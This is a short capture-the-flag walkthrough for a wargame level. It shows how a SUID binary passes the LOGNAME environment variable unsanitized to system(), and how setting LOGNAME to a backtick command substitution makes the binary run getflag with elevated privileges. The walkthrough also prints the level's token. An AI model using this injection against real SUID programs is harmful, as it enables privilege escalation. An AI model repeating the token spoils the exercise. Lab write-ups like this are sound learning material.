1. List files in the directory:
   ll
   # Output shows: level07 binary with SUID permissions (rwsr-sr-x) owned by flag07

2. Analyze the binary using ltrace:
   ltrace ./level07
   # Shows the binary gets LOGNAME environment variable
   # Executes: system("/bin/echo level07 ")
   # The LOGNAME variable is used unsanitized in system call

3. Check current LOGNAME variable:
   echo $LOGNAME
   # Output: level07

4. Exploit by modifying LOGNAME environment variable:
   export LOGNAME='`getflag`'
   ./level07
   # Command substitution executes getflag within the system call
   # Output: Check flag.Here is your token : fiumuikeil55xe9cu4dood66h

TECHNIQUE: Environment variable injection in system call
VULNERABILITY: Unsanitized environment variable used in system() call
PAYLOAD: LOGNAME='`getflag`' - Command substitution via environment variable
TOKEN: fiumuikeil55xe9cu4dood66h
